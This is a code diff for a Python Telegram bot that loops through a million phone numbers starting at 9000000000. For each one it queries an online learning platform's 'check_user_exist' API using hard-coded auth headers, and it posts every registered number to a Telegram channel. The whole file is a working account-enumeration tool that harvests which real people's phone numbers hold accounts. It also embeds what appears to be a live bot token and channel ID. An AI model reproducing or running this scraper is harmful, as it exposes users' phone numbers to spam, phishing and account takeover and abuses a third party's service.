@@ -1,93 +1,107 @@
-import os
+import requests
 import time
-import logging
 import asyncio
-from telegram import Bot, ParseMode
-from telegram.ext import Application, CommandHandler, MessageHandler, filters
 from telegram import Update
-from flask import Flask
-from requests import get
-from tqdm import tqdm
+from telegram.ext import Application, CommandHandler, ContextTypes
 
-app = Flask(__name__)
+# Your Telegram bot token
+TOKEN = '7193921126:AAFOJVvniqaxqFzePHfHlgK0I23Rwwx5sEw'
+CHANNEL_ID = '-1002388515011'  # The channel where you want to post progress
 
-# Replace with your bot's token and channel chat ID
-TELEGRAM_BOT_TOKEN = '7193921126:AAFOJVvniqaxqFzePHfHlgK0I23Rwwx5sEw'
-CHANNEL_ID = '-1002388515011'
-bot = Bot(TELEGRAM_BOT_TOKEN)
+# URL and headers for checking the user
+url = "https://voraclassesapi.classx.co.in/get/check_user_exist"
+headers = {
+    "Client-Service": "Appx",
+    "Auth-Key": "appxapi",
+    "source": "website"
+}
 
-# List to store the numbers and status (True/False)
-numbers_to_check = [str(i) for i in range(9000000000, 9100000000)]
-checked_numbers = []
-total_numbers = len(numbers_to_check)
+# Function to check user existence
+def check_user_exist(phone_number):
+    params = {
+        "email_or_phone": str(phone_number)
+    }
 
-async def check_numbers(update: Update, context):
-    # Send initial message with progress bar
-    progress_message = await bot.send_message(
-        chat_id=CHANNEL_ID,
-        text=f"Checking Phone Numbers: 0/{total_numbers}\nLast checked: 9000000000\nTime left: Loading...",
+    # Sending the GET request
+    response = requests.get(url, headers=headers, params=params)
+
+    if response.status_code == 200:
+        response_data = response.json()
+        if response_data.get("data") == True:
+            return True
+    return False
+
+# Function to run the number check and send progress updates
+async def check_numbers(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    total_numbers = 1000000  # We will check 1000 numbers
+    start_number = 9000000000
+    checked_numbers = 0
+    last_checked_number = None  # To store the last checked number
+    start_time = time.time()  # Start time for calculating elapsed time
+
+    # Send initial progress message
+    progress_message = await update.message.reply_text(
+        text="Starting to check numbers...\n"
+             f"Total numbers: {total_numbers}\n"
+             f"Checked numbers: {checked_numbers}\n"
+             f"Time left: Calculating...\n"
+             f"Last checked number: N/A"
     )
 
-    start_time = time.time()
+    # Time interval between each check (60 seconds / 1000 numbers = 0.06 seconds)
+    check_interval = 0.06
 
-    for index, number in enumerate(numbers_to_check):
-        # API request to check if the number exists
-        response = get(f"https://isaclearningapi.akamai.net.in/get/check_user_exist?email_or_phone={number}")
-        data = response.json()
-        
-        if data["status"] == 200 and data["data"]:
-            # Send the phone number if found to the channel
-            await bot.send_message(
+    # Progress bar loop
+    for phone_number in range(start_number, start_number + total_numbers):
+        # Check if the user exists
+        if check_user_exist(phone_number):
+            # Send message to the channel if user exists
+            await context.bot.send_message(
                 chat_id=CHANNEL_ID,
-                text=f"Valid number found: {number}",
+                text=f"{phone_number}"
             )
 
-        # Update progress bar every 10 seconds
-        if index % 10 == 0:
-            elapsed_time = time.time() - start_time
-            time_left = (total_numbers - index) * (elapsed_time / (index + 1))
-            minutes_left, seconds_left = divmod(time_left, 60)
-            progress_text = f"Checking Phone Numbers: {index}/{total_numbers}\n" \
-                            f"Last checked: {number}\n" \
-                            f"Time left: {int(minutes_left)}:{int(seconds_left)}"
-            await bot.edit_message_text(
-                chat_id=CHANNEL_ID,
-                message_id=progress_message.message_id,
-                text=progress_text,
-            )
-        checked_numbers.append(number)
+        # Update last checked number
+        last_checked_number = phone_number
 
-    await bot.edit_message_text(
-        chat_id=CHANNEL_ID,
-        message_id=progress_message.message_id,
-        text=f"Check complete! All numbers have been processed.",
+        # Update progress after each check
+        checked_numbers += 1
+        elapsed_time = time.time() - start_time
+        time_left = (total_numbers - checked_numbers) / (checked_numbers / elapsed_time)
+        minutes_left = time_left // 60
+        seconds_left = time_left % 60
+
+        # Update the progress message every 100 checks
+        if checked_numbers % 100 == 0:
+            # Update progress in the channel every 100 checks
+            await progress_message.edit_text(
+                text=f"Progress:\n"
+                     f"Total numbers: {total_numbers}\n"
+                     f"Checked numbers: {checked_numbers}\n"
+                     f"Time left: {int(minutes_left)}:{int(seconds_left)}\n"
+                     f"Last checked number: {last_checked_number}"
+            )
+
+        # Sleep to ensure we check 1000 numbers in 60 seconds
+        await asyncio.sleep(check_interval)  # This ensures we wait before proceeding to next number
+
+    # Final message when completed
+    await progress_message.edit_text(
+        text=f"Finished checking numbers.\nTotal numbers: {total_numbers}\nChecked numbers: {checked_numbers}\nLast checked number: {last_checked_number}"
     )
 
+# Function to start the bot
+async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    await update.message.reply_text("Bot started! Use /check to start checking numbers.")
 
-async def start(update: Update, context):
-    await update.message.reply_text("Bot started, checking numbers...")
-
-async def stop(update: Update, context):
-    await update.message.reply_text("Bot stopped.")
-
-# Set up Telegram bot handlers
+# Main function to start the bot and handle commands
 def main():
-    application = Application.builder().token(TELEGRAM_BOT_TOKEN).build()
+    application = Application.builder().token(TOKEN).build()
 
-    # Command handlers
     application.add_handler(CommandHandler("start", start))
-    application.add_handler(CommandHandler("stop", stop))
+    application.add_handler(CommandHandler("check", check_numbers))
 
-    # Run the bot continuously
-    application.run_polling(allowed_updates=Update.ALL)
-
-# Flask route to check server health
-@app.route('/health')
-def health():
-    return "OK", 200
+    application.run_polling()
 
 if __name__ == "__main__":
-    # Run Flask app and start the bot concurrently
-    loop = asyncio.get_event_loop()
-    loop.create_task(main())
-    app.run(host="0.0.0.0", port=5000)
+    main()
